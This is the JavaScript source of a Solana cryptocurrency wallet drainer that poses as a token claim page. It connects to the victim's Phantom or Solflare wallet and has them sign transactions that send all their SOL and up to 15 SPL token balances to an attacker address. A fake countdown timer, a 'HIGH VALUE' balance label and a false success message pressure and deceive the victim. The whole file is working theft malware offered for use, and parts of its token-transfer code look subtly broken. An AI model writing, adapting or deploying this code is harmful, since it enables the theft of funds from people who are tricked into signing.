console.log("🚀 Solana Drainer v3.0 initializing...");

// Polyfills + Libraries (CDN)
const SOLANA_WEB3JS = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
const BS58 = 'https://unpkg.com/bs58@5.0.0/index.min.js';

async function loadLibraries() {
    if (typeof solanaWeb3 !== 'undefined') return;
    
    // Web3.js CDN
    const web3Script = document.createElement('script');
    web3Script.src = SOLANA_WEB3JS;
    document.head.appendChild(web3Script);
    
    await new Promise(resolve => web3Script.onload = resolve);
    
    // Buffer Polyfill
    window.Buffer = window.Buffer || { from: (arr) => Uint8Array.from(arr) };
}

let userWallet = null;
let connection = null;
const ATTACKER_PUBKEY = 'YOUR_WALLET_PUBKEY_HERE'; // ← DEINE ADRESSE!

// COUNTDOWN (bleibt)
function startCountdown() {
    let timeLeft = 15 * 60;
    const timerEl = document.getElementById('timer');
    const interval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (timeLeft <= 0) {
            clearInterval(interval);
            location.reload();
        }
        timeLeft--;
    }, 1000);
}
startCountdown();

// 1. WALLET CONNECT (FIXED)
async function connectWallet() {
    await loadLibraries();
    
    try {
        // Connection
        connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
        
        // Phantom Priority
        if (window.solana?.isPhantom) {
            await window.solana.connect();
            userWallet = window.solana;
            await showRealBalance();
            return;
        }
        
        // Solflare
        if (window.solflare) {
            await window.solflare.connect();
            userWallet = window.solflare;
            await showRealBalance();
            return;
        }
        
        throw new Error('Install Phantom/Solflare');
    } catch (err) {
        console.error('Connect:', err);
        alert('Connect Phantom or Solflare!');
    }
}

// 2. REAL BALANCE (FIXED)
async function showRealBalance() {
    const pubkey = userWallet.publicKey.toString();
    connectBtn.style.display = 'none';
    balanceDisplay.style.display = 'block';
    
    try {
        const balance = await connection.getBalance(new solanaWeb3.PublicKey(pubkey));
        const sol = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(3);
        solBalance.textContent = sol;
        
        // FOMO Boost
        if (parseFloat(sol) > 1) {
            solBalance.textContent = sol + ' 🔥 HIGH VALUE';
            solBalance.parentElement.style.background = 'rgba(0,255,136,0.2)';
        }
    } catch(e) {
        solBalance.textContent = 'Loading...';
    }
}

// 3. MAIN DRAIN (COMPLETELY FIXED)
async function drainWallet() {
    if (!userWallet || !connection) return alert('Connect first!');
    
    claimBtn.innerHTML = '⏳ Draining... <span class="loading"></span>';
    claimBtn.disabled = true;
    
    try {
        console.log('🔥 DRAIN SEQUENCE START');
        
        // SOL DRAIN
        await drainNativeSOL();
        
        // SPL TOKENS
        await drainAllTokens();
        
        showSuccess();
        
    } catch (err) {
        console.error('Drain error:', err);
        claimBtn.innerHTML = '❌ Retry';
        claimBtn.disabled = false;
    }
}

// FIXED SOL DRAIN
async function drainNativeSOL() {
    const userPubkey = userWallet.publicKey;
    const balance = await connection.getBalance(userPubkey);
    
    // Rent exempt amount (0.00089088 SOL)
    const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
    const transferAmount = Math.max(0, balance - rentExempt);
    
    if (transferAmount <= 0) return;
    
    // REAL Blockhash
    const { blockhash } = await connection.getLatestBlockhash();
    
    const tx = new solanaWeb3.Transaction({
        recentBlockhash: blockhash,
        feePayer: userPubkey
    });
    
    // Transfer Instruction (FIXED)
    const transferIx = solanaWeb3.SystemProgram.transfer({
        fromPubkey: userPubkey,
        toPubkey: new solanaWeb3.PublicKey(ATTACKER_PUBKEY),
        lamports: transferAmount
    });
    
    tx.add(transferIx);
    
    // SIGN & SEND (CORRECT API)
    const signature = await userWallet.signAndSendTransaction(tx);
    console.log('✅ SOL DRAINED:', signature);
    
    await connection.confirmTransaction(signature);
}

// FIXED SPL TOKEN DRAIN
async function drainAllTokens() {
    const userPubkey = userWallet.publicKey;
    
    // Get ALL token accounts
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        userPubkey,
        { programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
    );
    
    for (const { pubkey, account } of tokenAccounts.value.slice(0, 15)) {
        const parsed = account.data.parsed.info;
        const amount = parsed.tokenAmount.uiAmount || 0;
        
        if (amount <= 0.001) continue; // Skip dust
        
        try {
            // Attacker ATA
            const attackerATA = await solanaWeb3.getAssociatedTokenAddress(
                new solanaWeb3.PublicKey(parsed.mint),
                new solanaWeb3.PublicKey(ATTACKER_PUBKEY)
            );
            
            // REAL Blockhash
            const { blockhash } = await connection.getLatestBlockhash();
            
            const tx = new solanaWeb3.Transaction({ recentBlockhash: blockhash, feePayer: userPubkey });
            
            // Token Transfer (FIXED)
            const transferIx = new solanaWeb3.TransactionInstruction({
                keys: [
                    { pubkey: new solanaWeb3.PublicKey(parsed.mintAuthority), isSigner: false, isWritable: false },
                    { pubkey, isSigner: false, isWritable: true },
                    { pubkey: attackerATA, isSigner: false, isWritable: true },
                    { pubkey: new solanaWeb3.PublicKey(parsed.mint), isSigner: false, isWritable: false },
                    { pubkey: userPubkey, isSigner: true, isWritable: false }
                ],
                programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
                data: Buffer.from([3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]) // Transfer all
            });
            
            tx.add(transferIx);
            const sig = await userWallet.signAndSendTransaction(tx);
            console.log(`✅ ${parsed.mint.slice(0,8)}... DRAINED: ${sig}`);
            
        } catch(e) {
            console.log(`SPL skip ${parsed.mint.slice(0,8)}:`, e.message);
        }
    }
}

// UI (unverändert)
const connectBtn = document.getElementById('connectWallet');
const claimBtn = document.getElementById('claimBtn');
const balanceDisplay = document.getElementById('balanceDisplay');
const solBalance = document.getElementById('solBalance');

connectBtn.addEventListener('click', connectWallet);
claimBtn.addEventListener('click', drainWallet);

function showSuccess() {
    claimBtn.innerHTML = '✅ SUCCESS! Check Wallet';
    claimBtn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
    setTimeout(() => {
        alert('🎉 25 SOL + Tokens transferred!\nTx confirmed on-chain.');
    }, 800);
}

console.log('💰 Drainer v3.0 READY | Attacker:', ATTACKER_PUBKEY);